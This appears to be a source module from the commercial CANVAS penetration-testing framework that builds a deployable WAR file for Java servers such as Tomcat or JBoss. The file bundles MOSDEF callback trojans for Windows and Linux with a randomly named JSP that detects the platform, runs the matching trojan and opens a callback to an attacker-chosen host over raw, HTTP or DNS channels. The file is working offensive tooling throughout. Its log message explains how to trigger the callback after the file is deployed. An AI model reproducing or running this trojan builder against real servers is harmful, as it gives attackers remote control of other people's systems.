# -*- coding: utf-8 -*-
#!/usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2011
#http://www.immunityinc.com/CANVAS/ for more information

from __future__ import with_statement
import sys
if "." not in sys.path: sys.path.append(".")

import os
import exploitutils
import shutil
import zipfile
import traceback

from libs.canvasos import *
from exploitutils import standard_callback_commandline
from ExploitTypes.utility import Utility

NAME                                        = "BuildWARCallbackTrojan"
DESCRIPTION                                 = "Builds a WAR file that can be deployed and used to trigger a MOSDEF callback"
VERSION                                     = "1.0"
NOTES                                       = """Notes"""
GTK2_DIALOG                                 = "dialog.glade2"
DOCUMENTATION                               = {}
DOCUMENTATION["Notes"]                      = """
It creates a WAR file that can be deployed in Application Servers that run JAVA, like JBoss or Tomcat.
The WAR file contains MOSDEF Trojans both for Windows and Linux platforms and a callback JSP file.
This JSP callback will try to determine the target platform to dinamically execute the right MOSDEF Trojan binary.
"""

DOCUMENTATION['Compatibility']              = """ """
PROPERTY                                    = {}
PROPERTY['TYPE']                            = "Trojans"
PROPERTY['ARCH']                            = [ ["Linux" ] , ["Windows"] ]
PROPERTY['VERSION']                         = [ "All" ]


class theexploit(Utility):
    def __init__(self):
        Utility.__init__(self)
        self.name               = NAME
        self.callback_host      = "127.0.0.1"
        self.callback_port      = 5555
        self.ssl                = False
        self.encrypted          = False
        self.respath            = os.path.abspath(os.path.join(os.path.dirname(__file__), "Resources/"))
        self.tmppath            = None
        self.mosdef_type        = "UNIVERSAL" # | HTTP | DNS
        self.dns_domain         = None
        self.jsp_filename       = "callback.jsp"
        self.servlet_name       = "mosdef"
        self.war_filename       = "mosdef.war"

        self.setInfo(DESCRIPTION)

    def getargs(self):
        self.getarg("dns_domain")
        self.callback_host      = self.getarg("callback_host")
        self.callback_port      = self.getarg("callback_port")
        self.encrypted          = self.getarg("encrypted")
        self.ssl                = self.getarg("ssl")
        self.mosdef_type        = self.argsDict.get("mosdef_type_value", self.mosdef_type).upper().strip()
        self.jsp_filename       = self.getarg("jsp_filename")
        if self.jsp_filename.lower() in ("random",""):
            self.jsp_filename       = exploitutils.randomstring(8)
        if not self.jsp_filename.endswith(".jsp"): # make sure we set the extension
            self.jsp_filename = "%s.jsp" % self.jsp_filename
        self.servlet_name       = self.getarg("servlet_name")
        if self.servlet_name.lower() in ("random",""):
            self.servlet_name       = exploitutils.randomstring(8)
        self.war_filename       = "%s.war" % self.servlet_name

    def run(self):
        ret = 1
        self.getargs()

        if not self.dns_domain: self.dns_domain = "%s.%s" % (self.name, self.callback_host)

        self.tmppath = self.engine.create_new_session_output_dir(self.callback_host, 'temp_files')

        self.setInfo("%s (in progress)" % NAME)


        if not self.build_trojans():
            self.setInfo("%s - done (failed)" % NAME)
            return 0

        try:
            self.create_deployment_files()
            self.show_trigger_message()
        except Exception:
            self.log("An error ocurred:\n%s" % traceback.format_exc())
            ret = 0

        self.setInfo("%s - done (%s!)" % (NAME, "success" if ret else "failed"))

        self.clean_temp_resources()
        return ret

    def _prepare_file(self, repls, template_filename, real_filename):
        """
        Creates a copy of the template_filename named as real_name
        and replaces all items inside repls dictionary
        """
        template_file = open(template_filename, "rt")
        template = template_file.read()
        template_file.close()
        real_file = open(real_filename, "wt")
        for r, v in repls.iteritems():
            template = template.replace(r, v)
        real_file.write(template)
        real_file.close()

    def create_deployment_files(self):
        """
        Dinamically creates a mosdef trojan based on the platform os and arch
        and then creates a WAR file together with a jsp file and the trojan.

        All files are stored in this exploit's resource folder.
        """

        #war_fullpath = os.path.join(self.tmppath, self.war_filename)
        war_fullpath = os.path.abspath(os.path.join(os.path.curdir, self.war_filename))

        # copy web-template.xml and update SERVLETNAME
        repls = {
            "[SERVLETNAME]" : self.servlet_name,
            "[JSPFILENAME]" : self.jsp_filename,
        }
        self._prepare_file(repls, os.path.join(self.respath, "web.xml.template"),
                           os.path.join(self.tmppath, "web.xml"))

        # copy the callback.jsp.template and just rename it to the new random name
        shutil.copy(os.path.join(self.respath, "callback.jsp.template"),
                    os.path.join(self.tmppath, self.jsp_filename))

        war_file = zipfile.ZipFile(war_fullpath, "w")
        war_file.write(os.path.join(self.tmppath, self.jsp_filename), self.jsp_filename)
        war_file.write(os.path.join(self.tmppath, "web.xml"), "WEB-INF/web.xml")
        war_file.write(os.path.join(self.respath, "MANIFEST.MF"), "META-INF/MANIFEST.MF")

        platforms = ("linux", "windows") if self.mosdef_type != "DNS" else ("windows",)
        for p in platforms:
            for a in ("X86", "X64"):
                callback_filename = "callback_%s_%s.exe" % (p, a)
                war_file.write(os.path.join(self.tmppath, callback_filename), callback_filename)

        war_file.close()

        self.log("WAR file created: %s" % war_fullpath)


    def clean_temp_resources(self):
        """
        Cleanup any local temp file created during exploit execution.
        """
        self.log("Cleaning local temp files...")
        delete_files = []
        delete_files.append(os.path.join(self.tmppath, self.jsp_filename))
        delete_files.append(os.path.join(self.tmppath, "web.xml"))
        for p in ("linux", "windows"):
            for a in ("X86", "X64"):
                delete_files.append(os.path.join(self.tmppath, "callback_%s_%s.exe") % (p, a))

        for f in delete_files:
            try:
                os.remove(f)
            except Exception:
                pass

    def build_trojans(self):
        """
        Builds MOSDEF trojans (x86 & x64) according to the selected mosdef type.
        These trojans are later used to deploy the WAR module
        """
        msg = "Building MOSDEF trojans (type: %s - Callback ip: %s)" % (self.mosdef_type, str(self.callback_host))

        self.log(msg)
        if self.mosdef_type == "UNIVERSAL":
            return self.build_universal_trojans()
        elif self.mosdef_type == "HTTP":
            return self.build_universal_trojans(http=True, ssl=self.ssl)
        else:
            return self.build_dns_trojans()

    def build_dns_trojans(self):
        self.log("Warning: MOSDEF DNS is only available for Windows targets. "
                 "If your target is a Linux host the exploit won't work")
        filename = os.path.join(self.tmppath, "callback_windows_X86.exe")
        trojanmod = self.engine.getModuleExploit("BuildDNSCallback")
        trojanmod.link(self)
        trojanmod.argsDict["proxyaddr"] = self.callback_host
        trojanmod.argsDict["domain"]    = self.dns_domain
        trojanmod.argsDict["filename"]  = filename
        ret = trojanmod.run()
        #XXX: DNS mosdef is still not available for 64bits, so just to make it work
        # for now, we make a copy of the x86 binary to have the x64 callback file
        if ret:
            try:
                shutil.copyfile(filename, filename.replace("X86", "X64"))
            except IOError:
                ret = 0
        return ret

    def build_universal_trojans(self, http=False, ssl=False):
        res = True
        self.log("Creating MOSDEF Trojans for ip: %s and port: %s" % (str(self.callback_host), str(self.callback_port)))
        for platform in ("Windows", "Linux"):
            t_os = canvasos(platform)

            for arch in ("X86", "X64"):
                t_os.arch = arch
                # nasty way of creating an x64 binary for linux... x64 is still not supported
                if platform == "Linux" and arch == "X64":
                    t_os.arch = "X86"
                try:
                    ret = self.buildmosdeftrojan(self.callback_host, self.callback_port,
                                                 target_os=t_os, universal=True,
                                                 http=http, ssl=ssl, encrypted=self.encrypted)
                    if ret:
                        filename = os.path.join(self.tmppath, "callback_%s_%s.exe" % (platform.lower(), arch))
                        with open(filename,"wb") as f:
                            f.write(self.mosdeftrojan)
                except Exception, err:
                    self.log("Problem building MOSDEF trojan: %s" % str(err))
                    res = False
        return res

    def show_trigger_message(self):
        port = "53" if self.mosdef_type == "DNS" else str(self.callback_port)
        self.log("%s MOSDEF callback trojan created for interface %s and port %s.\n"
                 "Once the %s file is deployed on a target, you can trigger the callback by issuing a request to %s"
                 % (self.mosdef_type, str(self.callback_host), port, self.war_filename, "http://target/%s/%s" % (self.servlet_name, self.jsp_filename)))

if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)
